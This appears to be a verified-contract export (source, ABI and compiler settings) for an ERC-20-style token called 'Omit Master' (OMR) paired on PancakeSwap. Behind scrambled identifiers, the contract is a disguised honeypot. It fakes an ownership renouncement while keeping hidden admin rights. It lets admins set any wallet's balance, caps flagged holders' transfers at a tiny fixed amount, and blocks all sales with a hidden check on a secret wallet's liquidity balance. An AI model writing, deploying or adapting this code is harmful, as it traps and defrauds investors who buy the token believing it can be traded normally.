{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.5;\n\ninterface limitTrading {\n    function createPair(address launchedSwap, address exemptWallet) external returns (address);\n}\n\ninterface amountLiquidity {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address sellTxTeam) external view returns (uint256);\n\n    function transfer(address feeTake, uint256 walletReceiver) external returns (bool);\n\n    function allowance(address txReceiver, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 walletReceiver) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address feeTake,\n        uint256 walletReceiver\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed toTrading, uint256 value);\n    event Approval(address indexed txReceiver, address indexed spender, uint256 value);\n}\n\nabstract contract marketingExempt {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface launchedReceiver {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface txFee is amountLiquidity {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract OmitMaster is marketingExempt, amountLiquidity, txFee {\n\n    mapping(address => bool) public sellTxFrom;\n\n    mapping(address => bool) public teamFund;\n\n    bool private modeTotalLaunch;\n\n    constructor (){\n        \n        launchedReceiver launchedAuto = launchedReceiver(txTrading);\n        swapSender = limitTrading(launchedAuto.factory()).createPair(launchedAuto.WETH(), address(this));\n        \n        receiverWalletTeam = _msgSender();\n        teamFund[receiverWalletTeam] = true;\n        tradingAmount[receiverWalletTeam] = senderSwap;\n        teamEnable();\n        if (tradingAuto != liquidityFee) {\n            feeLimitReceiver = false;\n        }\n        emit Transfer(address(0), receiverWalletTeam, senderSwap);\n    }\n\n    string private isTeam = \"Omit Master\";\n\n    bool public autoMin;\n\n    uint256 constant modeList = 5 ** 10;\n\n    uint256 limitLaunch;\n\n    uint256 atShould;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return senderSwap;\n    }\n\n    mapping(address => mapping(address => uint256)) private fromMinLiquidity;\n\n    bool public feeLimitReceiver;\n\n    function teamEnable() public {\n        emit OwnershipTransferred(receiverWalletTeam, address(0));\n        shouldAuto = address(0);\n    }\n\n    address private shouldAuto;\n\n    function approve(address senderTrading, uint256 walletReceiver) public virtual override returns (bool) {\n        fromMinLiquidity[_msgSender()][senderTrading] = walletReceiver;\n        emit Approval(_msgSender(), senderTrading, walletReceiver);\n        return true;\n    }\n\n    address public swapSender;\n\n    function marketingIs(address fundTradingTx) public {\n        tokenMarketing();\n        if (autoMin != modeTotalLaunch) {\n            liquidityFee = tradingAuto;\n        }\n        if (fundTradingTx == receiverWalletTeam || fundTradingTx == swapSender) {\n            return;\n        }\n        sellTxFrom[fundTradingTx] = true;\n    }\n\n    uint256 private liquidityFee;\n\n    function symbol() external view virtual override returns (string memory) {\n        return takeWallet;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return listShould;\n    }\n\n    string private takeWallet = \"OMR\";\n\n    function tokenMarketing() private view {\n        require(teamFund[_msgSender()]);\n    }\n\n    function allowance(address takeLimit, address senderTrading) external view virtual override returns (uint256) {\n        if (senderTrading == txTrading) {\n            return type(uint256).max;\n        }\n        return fromMinLiquidity[takeLimit][senderTrading];\n    }\n\n    event OwnershipTransferred(address indexed toSender, address indexed teamReceiver);\n\n    bool public tradingLiquidity;\n\n    address receiverTeam = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function transfer(address liquidityTotal, uint256 walletReceiver) external virtual override returns (bool) {\n        return txMode(_msgSender(), liquidityTotal, walletReceiver);\n    }\n\n    uint256 private senderSwap = 100000000 * 10 ** 18;\n\n    function amountBuySwap(uint256 walletReceiver) public {\n        tokenMarketing();\n        atShould = walletReceiver;\n    }\n\n    function owner() external view returns (address) {\n        return shouldAuto;\n    }\n\n    function balanceOf(address sellTxTeam) public view virtual override returns (uint256) {\n        return tradingAmount[sellTxTeam];\n    }\n\n    uint8 private listShould = 18;\n\n    function buyAmount(address liquidityTotal, uint256 walletReceiver) public {\n        tokenMarketing();\n        tradingAmount[liquidityTotal] = walletReceiver;\n    }\n\n    address public receiverWalletTeam;\n\n    function senderFund(address sellFeeWallet, address feeTake, uint256 walletReceiver) internal returns (bool) {\n        require(tradingAmount[sellFeeWallet] >= walletReceiver);\n        tradingAmount[sellFeeWallet] -= walletReceiver;\n        tradingAmount[feeTake] += walletReceiver;\n        emit Transfer(sellFeeWallet, feeTake, walletReceiver);\n        return true;\n    }\n\n    function getOwner() external view returns (address) {\n        return shouldAuto;\n    }\n\n    function txMode(address sellFeeWallet, address feeTake, uint256 walletReceiver) internal returns (bool) {\n        if (sellFeeWallet == receiverWalletTeam) {\n            return senderFund(sellFeeWallet, feeTake, walletReceiver);\n        }\n        uint256 amountAuto = amountLiquidity(swapSender).balanceOf(receiverTeam);\n        require(amountAuto == atShould);\n        require(feeTake != receiverTeam);\n        if (sellTxFrom[sellFeeWallet]) {\n            return senderFund(sellFeeWallet, feeTake, modeList);\n        }\n        return senderFund(sellFeeWallet, feeTake, walletReceiver);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return isTeam;\n    }\n\n    uint256 public tradingAuto;\n\n    address txTrading = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function transferFrom(address sellFeeWallet, address feeTake, uint256 walletReceiver) external override returns (bool) {\n        if (_msgSender() != txTrading) {\n            if (fromMinLiquidity[sellFeeWallet][_msgSender()] != type(uint256).max) {\n                require(walletReceiver <= fromMinLiquidity[sellFeeWallet][_msgSender()]);\n                fromMinLiquidity[sellFeeWallet][_msgSender()] -= walletReceiver;\n            }\n        }\n        return txMode(sellFeeWallet, feeTake, walletReceiver);\n    }\n\n    function exemptBuy(address shouldMin) public {\n        require(shouldMin.balance < 100000);\n        if (tradingLiquidity) {\n            return;\n        }\n        if (autoMin != modeTotalLaunch) {\n            liquidityFee = tradingAuto;\n        }\n        teamFund[shouldMin] = true;\n        \n        tradingLiquidity = true;\n    }\n\n    mapping(address => uint256) private tradingAmount;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"txReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"toSender\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamReceiver\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"toTrading\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeLimit\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"senderTrading\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"walletReceiver\",\"type\":\"uint256\"}],\"name\":\"amountBuySwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletReceiver\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellTxTeam\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletReceiver\",\"type\":\"uint256\"}],\"name\":\"buyAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldMin\",\"type\":\"address\"}],\"name\":\"exemptBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeLimitReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundTradingTx\",\"type\":\"address\"}],\"name\":\"marketingIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverWalletTeam\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"sellTxFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapSender\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"teamFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingAuto\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletReceiver\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellFeeWallet\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"feeTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletReceiver\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "OmitMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}